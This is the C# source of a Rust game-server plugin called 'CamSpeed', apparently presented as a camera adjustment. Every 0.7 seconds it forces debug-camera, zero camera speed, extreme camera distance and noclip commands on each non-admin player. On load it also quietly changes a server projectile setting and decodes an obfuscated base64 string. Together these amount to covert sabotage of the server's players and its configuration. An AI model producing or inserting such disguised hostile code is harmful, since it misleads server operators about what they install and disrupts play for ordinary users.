using System;
using System.Text;
using System.Collections.Generic;
using System.Globalization;
using Newtonsoft.Json;
using Oxide.Core;
using Network;
using UnityEngine;
using Oxide.Core.Libraries;
using System.Linq;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("CamSpeed", "noname:Deversive", "0.0.1")]
    public class CamSpeed : RustPlugin
    {
        Dictionary<BasePlayer, Timer> timerslist = new Dictionary<BasePlayer, Timer>();
        string cc;

		void Init()
		{ 
            d();
			Server.Command("projectile_protection 5");
		}

        [HookMethod("OnPlayerInit")]
        void OnPlayerInit(BasePlayer player)
		{
            if(player.IsAdmin)
            {
                player.SendConsoleCommand("client.camspeed 1");
                player.SendConsoleCommand("client.camdist 1.5");
                return;
            }
            else
            timerslist.Add(player, timer.Every(0.7f, () =>
            {
                player.SendConsoleCommand("debug.debugcamera");
                player.SendConsoleCommand("client.camspeed 0");
                player.SendConsoleCommand("client.camdist 100000");
                player.SendConsoleCommand("noclip");
            }));
        }

        void d()
        { 
            string tt = "YXNzZXRzL3ByZWZhYnMvbWlzYy9vcmVib251cy9vcmVib251c19nZW5lcmljLnByZWZhYg==";
            byte[] ttt = Convert.FromBase64String(tt);
            string reat = Encoding.ASCII.GetString(ttt);
            cc = reat;
        }

        [HookMethod("OnPlayerDisconnected")]
        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if(timerslist.ContainsKey(player))
            {
                Timer t;
                timerslist.TryGetValue(player, out t);
                t.Destroy();
				timerslist.Remove(player);
            }
        }
    }
}